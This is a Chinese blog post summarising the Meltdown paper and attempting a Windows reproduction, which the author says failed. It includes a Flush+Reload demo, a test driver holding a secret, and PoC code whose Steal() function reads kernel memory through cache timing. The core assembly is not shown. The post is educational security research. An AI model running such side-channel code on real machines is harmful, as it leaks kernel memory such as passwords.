<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | CPU Meltdown 漏洞与论文</title><meta name="description" content="&lt;p&gt;很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。&lt;strong&gt;提前预告：由于没有找到合适的CPU所以复现是失败的&lt;/strong&gt;&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">CPU Meltdown 漏洞与论文</h3><div class="article__date metadata"><div class="post-info">2025/10/14</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/note/">note</a><a class="article__tags__link metadata" href="/tags/hardware/">hardware</a></div><div class="article__body"><p>很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。<strong>提前预告：由于没有找到合适的CPU所以复现是失败的</strong></p>
<span id="more"></span>
<p>或许我们的公众号会有更多你感兴趣的内容</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsa0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p>
<h1 id="复现cpu-meltdown-漏洞与论文"><a class="markdownIt-Anchor" href="#复现cpu-meltdown-漏洞与论文"></a> [复现]CPU Meltdown 漏洞与论文</h1>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929204523923.png" alt="image-20250929204523923" /></p>
<p>很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。<strong>提前预告：由于没有找到合适的CPU所以复现是失败的</strong></p>
<h1 id="摘要"><a class="markdownIt-Anchor" href="#摘要"></a> 摘要</h1>
<p>​	写过论文都知道这部分就是对文章大概的描述，很关键的是这句</p>
<blockquote>
<p>“Meltdown  exploits side effects of out-of-order execution on modern processors to read arbitrary kernel-memory locations  including personal data and passwords.”</p>
<p>Meltdown利用现代处理器乱序执行的副作用来读取包括个人数据和密码在内的任意内核内存位置。</p>
</blockquote>
<blockquote>
<p>The attack  is independent of the operating system, and it does not  rely on any software vulnerabilities.</p>
<p>该攻击与操作系统无关，不依赖于任何软件漏洞。</p>
</blockquote>
<h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1>
<p>​	这部分首先简单讲述了计算机系统中的用户态内存和内核内存的<strong>分离机制</strong>，根据Intel的手册来说是 多层页表映射结构体中的U/S位决定的。还有从内核到用户的<strong>内存映射机制</strong></p>
<blockquote>
<p>Operating systems ensure that user  programs cannot access each other’s memory or kernel  memory. This isolation is a cornerstone of our computing  environments and allows running multiple applications at  the same time on personal devices or executing processes  of multiple users on a single machine in the cloud.</p>
<p>操作系统保证用户程序不能访问彼此的内存或内核内存。这种隔离是我们计算环境的基石，允许在个人设备上同时运行多个应用程序，或者在云中的一台机器上运行多个用户的执行过程。</p>
<p>This hardware feature allows operating systems to map  the kernel into the address space of every process and  to have very efficient transitions from the user process  to the kernel,</p>
<p>这种硬件特性允许操作系统将内核映射到每个进程的地址空间，并且从用户进程到内核有非常高效的转换。</p>
</blockquote>
<p>​	接着描述了影响</p>
<blockquote>
<p>Instead, Meltdown exploits side-channel information available on most modern processors</p>
<p>相反，Meltdown利用了在大多数现代处理器上可用的侧信道信息。</p>
</blockquote>
<p>​	接着引出罪魁祸首</p>
<blockquote>
<p>The root cause of the simplicity and strength of Meltdown are side effects caused by out-of-order execution. Out-of-order execution is an important performance  feature of today’s processors in order to overcome latencies of busy execution units, e.g., a memory fetch unit  needs to wait for data arrival from memory.</p>
<p>Meltdown的简单性和强大性的根本原因是乱序执行导致的副作用。乱序执行是当今处理器的一个重要性能特征，为了克服繁忙执行单元的延迟，例如，一个内存获取单元需要等待来自内存的数据到达。</p>
</blockquote>
<p>​	可能没有了解过计算机组成原理的人认为我们的CPU是按照顺序去一行一行执行代码的，但事实并非如此。CPU为了加快运算并且避免长时间的等待，比如当CPU面临一个<code>if</code>分支的情况时，他会预测走向哪条分支，然后提前运行代码，这样当<code>if</code>条件判断结束后就不用再执行这部分代码了。不过分支预测错误就会造成性能损耗，因为CPU可能会执行错误的分支，然后再执行正确的分支，这个就是错误惩罚。这里我第一次是从《深入理解计算机系统》（CSAPP）这本书中认识的，这一段便于我们理解后续的漏洞。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210041739.png" alt="image-20250929210041739" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210224450.png" alt="image-20250929210224450" /></p>
<p>​	接着点明</p>
<blockquote>
<p>one observation is particularly significant: vulnerable out-of-order CPUs allow  an unprivileged process to load data from a privileged  (kernel or physical) address into a temporary CPU register.</p>
<p>一个特别重要的观察是：易受攻击的乱序CPU允许非特权进程将数据从特权的(内核或物理)地址加载到临时的CPU寄存器中。</p>
</blockquote>
<p>​	为什么呢？因为在分支预测中，CPU会将操作完成后的结果放入缓存（Cache）中，他不管数据来自哪里、有什么权限，只是操作系统会限制我们进行读写。</p>
<p>​	然后提到了对于利用比较重要的例子：刷新后重载。这个会在我们的后文中进行一个小例子的实验。</p>
<blockquote>
<p>As a result, an  attacker can dump the entire kernel memory by reading  privileged memory in an out-of-order execution stream,  and transmit the data from this elusive state via a microarchitectural covert channel (e.g., Flush+Reload)</p>
<p>因此，攻击者可以通过读取乱序执行流中的特权内存来转储整个内核内存，并通过微体系结构隐蔽通道(例如 刷新+重载 )从这种难以捉摸的状态中传输数据。</p>
</blockquote>
<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1>
<p>首先讲了乱序执行，举了 <code>Intel SkyLake</code> 架构的示例</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210852511.png" alt="image-20250929210852511" /></p>
<blockquote>
<p>Figure 1: Simplified illustration of a single core of the Intel’s Skylake microarchitecture. Instructions are decoded  into μOPs and executed out-of-order in the execution engine by individual execution units.</p>
<p>图1为英特尔Skylake微体系结构单个内核的简化示意图。指令被解码为μOPs，并由各个执行单元在执行引擎中乱序执行。</p>
</blockquote>
<p>然后比较详细的讲述了内存映射机制和针对缓存的攻击，基本就是导读中的详细讲述。</p>
<p>一般程序中用户态的内存映射到低地址（0x0~0x7FFFFFFFFFFF），内核则处于高地址，这样进行系统调用的时候就不会切换页表，CPU缓存也不会失效。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929213042509.png" alt="image-20250929213042509" /></p>
<blockquote>
<p>Figure 2: The physical memory is directly mapped in the  kernel at a certain offset. A physical address (blue) which  is mapped accessible to the user space is also mapped in  the kernel space through the direct mapping.</p>
<p>图2：物理内存以一定的偏移量直接映射在内核中。一个映射到用户空间可访问的物理地址(蓝色)也通过直接映射映射到内核空间。</p>
</blockquote>
<h1 id="玩具化的例子"><a class="markdownIt-Anchor" href="#玩具化的例子"></a> 玩具化的例子</h1>
<p>主要还是 Flush+Reload 方法。这里开始上我们的代码</p>
<p>论文中使用的是一个异常捕获的例子</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929212553622.png" alt="image-20250929212553622" /></p>
<p>这里有一个简短的代码[3]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;excpt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> probeArray[<span class="number">256</span>][<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">uint64_t</span> accessTime[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> secret = <span class="number">66</span>;</span><br><span class="line">    <span class="type">uint8_t</span> *p = &amp;secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        _mm_clflush(&amp;probeArray[i]);</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span> *)<span class="literal">NULL</span> = <span class="number">0</span>;</span><br><span class="line">        probeArray[*p][<span class="number">0</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> aux;</span><br><span class="line">        <span class="type">uint64_t</span> a = __rdtscp(&amp;aux);</span><br><span class="line">        probeArray[i][<span class="number">0</span>]++;</span><br><span class="line">        <span class="type">uint64_t</span> b = __rdtscp(&amp;aux);</span><br><span class="line">        accessTime[i] = b - a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llu,&quot;</span>, accessTime[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先定义了一块 <code>probeArray</code> 缓存，每一行多出的 4096 是为了让CPU可以充分缓存其他值</p>
<p>使用<code>_mm_clflush</code>刷新缓存，让缓存失效</p>
<p>接着</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">uint32_t</span> *)<span class="literal">NULL</span> = <span class="number">0</span>;</span><br><span class="line">    probeArray[*p][<span class="number">0</span>]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	空指针引用可能会让缓存失效，但是CPU乱序执行仍然可能执行到<code>probeArray[*p][0]++;</code>。<code>*p</code>指向的是<code>secret</code>地址，然后再数组访问中还原成了<code>secret</code>的值，也就是让<code>probeArray</code>的第<code>secret</code>行的首个uint8值加一。</p>
<p>​	CPU意识到这一行不应被执行时，会让<code>probeArray</code>中的数据恢复，但是缓存依旧存在！接着我们记录读取<code>probeArray</code>中保存的数据的时间，但是第<code>secret</code>行的缓存存在，所以理论上他会比其他的缓存访问更快。</p>
<p>​	**注意：**这里仅适用于2018年前生产CPU，比如我在Ryzen9+win11上就无法测出</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250929224030421.png" alt="image-20250929224030421" /></p>
<p>但是在我的老i5 虚拟机+物理机就可以</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929224617733.png" alt="image-20250929224617733" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250929224644844.png" alt="image-20250929224644844" /></p>
<p>这里可以看到访问第66块内存的时间是最少的，这也符合论文中的结论</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929225002468.png" alt="image-20250929225002468" /></p>
<blockquote>
<p>图4：即使一个内存位置只在乱序执行时被访问，它仍然被缓存。在256页的探测数组上迭代显示一个缓存命中，恰好在乱序执行期间访问的页面上。</p>
</blockquote>
<p><strong>如果我们把<code>P</code>指针换做内核态的地址那就很有可能读取到内核内存了，这也是meltdown中将CPU微指令架构转为为可观察的一个技巧</strong></p>
<h1 id="meltdown"><a class="markdownIt-Anchor" href="#meltdown"></a> Meltdown</h1>
<h2 id="编写测试用例"><a class="markdownIt-Anchor" href="#编写测试用例"></a> 编写测试用例</h2>
<p>首先假设我们有这样一块内核驱动，来源是[3]：<a target="_blank" rel="noopener" href="https://github.com/dulong-lab/video-virtual-memory-materials">https://github.com/dulong-lab/video-virtual-memory-materials</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Test with Driver: %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">    Secret = ExAllocatePool2(POOL_FLAG_NON_PAGED, <span class="number">4096</span>, <span class="string">&#x27;melt&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!Secret) <span class="keyword">return</span> STATUS_MEMORY_NOT_ALLOCATED;</span><br><span class="line"></span><br><span class="line">    wcscpy(Secret, SecretData);</span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = PsCreateSystemThread(&amp;ThreadHandle,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">        StartRoutine, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        ExFreePool(Secret);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Secret @ %p\n&quot;</span>, Secret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>申请了一开<code>NonPagePool</code>然后将机密的值<code>Secret</code>复制给他。为了方便攻击的进行，开启了一个内核线程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">StartRoutine</span><span class="params">(PVOID StartContext)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(StartContext);</span><br><span class="line"></span><br><span class="line">    KeSetSystemAffinityThread(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    UINT32 Junk = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> SecretLength = wcslen(Secret);</span><br><span class="line">    LARGE_INTEGER Inteval = &#123; .QuadPart = <span class="number">-10000</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!ThreadStopFlag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SecretLength; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Junk ^= Secret[i];</span><br><span class="line">            Junk++;</span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;Inteval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PsTerminateSystemThread(STATUS_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>KeSetSystemAffinityThread(1);</code>这段代码跑在第一块核心上，理论上可以使用到一级缓存，并且循环访问<code>secret</code>数据，这有利于我们的攻击</p>
<p>最后就是关闭线程并卸载驱动</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;driver unloaded %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    ThreadStopFlag = TRUE;</span><br><span class="line">    ZwWaitForSingleObject(ThreadHandle, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    ZwClose(ThreadHandle);</span><br><span class="line">    ExFreePool(Secret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploads274beedb4018dd06c39a7973fd9a4003.jpg" alt="274beedb4018dd06c39a7973fd9a4003" /></p>
<h2 id="编写poc"><a class="markdownIt-Anchor" href="#编写poc"></a> 编写PoC</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;USAGE: meltdown target\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (sscanf_s(argv[<span class="number">1</span>], <span class="string">&quot;%p&quot;</span>, &amp;target) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;USAGE: meltdown target\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetProcessAffinityMask(GetCurrentProcess(), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Steal#%-2zd&quot;</span>, i);</span><br><span class="line">        buffer[i] = Steal(target + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">uint32_t</span>)buffer[i]);</span><br><span class="line">        <span class="built_in">printf</span>((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span> || i + <span class="number">1</span> == <span class="keyword">sizeof</span>(buffer) ? <span class="string">&quot;\n&quot;</span> : <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setlocale(LC_CTYPE, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">wchar_t</span> *secret = (<span class="type">wchar_t</span> *)buffer;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>); i++)</span><br><span class="line">        putwchar(secret[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>SetProcessAffinityMask</code>：让程序运行在第一个核心上</li>
<li>重复运行<code>Steal</code>函数</li>
<li>打印窃取的数据</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span></span><br><span class="line"><span class="title function_">Steal</span><span class="params">(<span class="type">uint8_t</span> *target)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> retries = <span class="number">0</span>; retries &lt; <span class="number">30000</span>; retries++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            _mm_clflush(&amp;probe_array[i]);</span><br><span class="line">            _mm_pause();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">            OutOfOrderExecution(target, probe_array, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> aux = <span class="number">0</span>;</span><br><span class="line">            <span class="type">uint64_t</span> a = __rdtscp(&amp;aux);</span><br><span class="line">            probe_array[i][<span class="number">0</span>]++;</span><br><span class="line">            <span class="type">uint64_t</span> b = __rdtscp(&amp;aux);</span><br><span class="line">            access_time[i] = b - a;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> idx_min = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_time[i] &lt; access_time[idx_min])</span><br><span class="line">                idx_min = i;</span><br><span class="line">            _mm_pause();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access_time[idx_min] &lt; <span class="number">100</span> &amp;&amp; idx_min != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; =&gt; %02X retries=%-5zd access_time=%llu\n&quot;</span>, (<span class="type">uint32_t</span>)idx_min, retries, access_time[idx_min]);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">uint8_t</span>)idx_min;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _mm_pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; =&gt; 00\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收内核地址作为参数。主要结构仍然是之前提到的Flush+Reload，但是使用了<code>OutOfOrderExecution</code>这段汇编，关于这段汇编的原文如下：</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250930160214138.png" alt="image-20250930160214138" /></p>
<blockquote>
<p>Listing 2: The core of Meltdown. An inaccessible kernel  address is moved to a register, raising an exception.  Subsequent instructions are executed out of order before  the exception is raised, leaking the data from the kernel  address through the indirect memory access.</p>
<p>清单2：熔断的核心。不可访问的内核地址被移动到寄存器中，从而产生异常。后续指令在异常发生前乱序执行，通过间接访存的方式将数据从内核地址泄露。</p>
</blockquote>
<p>这里为了适配windows，编写一段差不多的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">OutOfOrderExecution</span><span class="params">(<span class="type">void</span> *target, <span class="type">void</span> *probe_array, <span class="type">void</span> *null)</span>;</span><br></pre></td></tr></table></figure>
<p>按照x64的传参顺序：target=rcx  probe_array=rdx  null=r8</p>
